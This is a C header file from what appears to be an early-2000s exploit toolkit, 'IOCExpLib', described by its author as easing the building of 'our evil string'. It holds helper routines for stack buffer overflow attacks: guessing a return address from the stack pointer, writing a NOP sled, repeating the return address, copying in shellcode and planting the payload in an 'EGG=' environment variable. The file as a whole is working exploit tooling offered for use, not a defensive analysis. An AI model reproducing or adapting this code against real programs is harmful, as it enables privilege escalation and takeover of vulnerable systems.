/*
 *  IOCExpLib.h - by IOC - www.ioc.fr.st
 *  Version: IOCExpLib v1.0a Beta - 06/03
 *  File name: IOCEL_string.h 
 *  Description: includes functions to ease building of our evil string
 *  Contact me - Li0n7@voila.fr
 *
 */



#ifndef __IOCEL_STRING_H
#define __IOCEL_STRING_H




#include "IOCExpLib.h"






#define VERBOSE
#define NOP                                          0x90
#define EGG                                           "EGG="








unsigned long
IOCExpLib_get_sp()
{
      __asm__("movl %esp,%eax");
}








long
IOCExpLib_return_address(long address, int offset)
{
      address = IOCExpLib_get_sp() - offset;
      fprintf(stderr, "[+] Using address: 0x%x\n", address);
      return address;
}








char
*IOCExpLib_put_nop(char *buff, int size)
{ 
      int i;
      for (i = 0; i < size; i++)
          buff[i] = NOP;
      return buff;
}









long
*IOCExpLib_put_raddress(long *addr_ptr, long address, char *ptr, int size, int align)
{
      int i;
      addr_ptr = (long *) ptr;
      for (i = 0; i < size; i+=4)
          *((addr_ptr++)+align) = address;
          //*(long*)(&buff[i]+align) = addr;
      return addr_ptr;
}








char
*IOCExpLib_put_shellcode(char *pointer, char *shellcode)
{
      int i;
      for (i = 0; i < strlen(shellcode); i++)
          *(pointer++) = shellcode[i];
      return pointer;
}








void
IOCExpLib_set_env(char *buffer)
{
      int size;

      size = sizeof(EGG) - 1;
      memcpy(buffer, EGG, size);
      putenv(buffer);
}


#endif






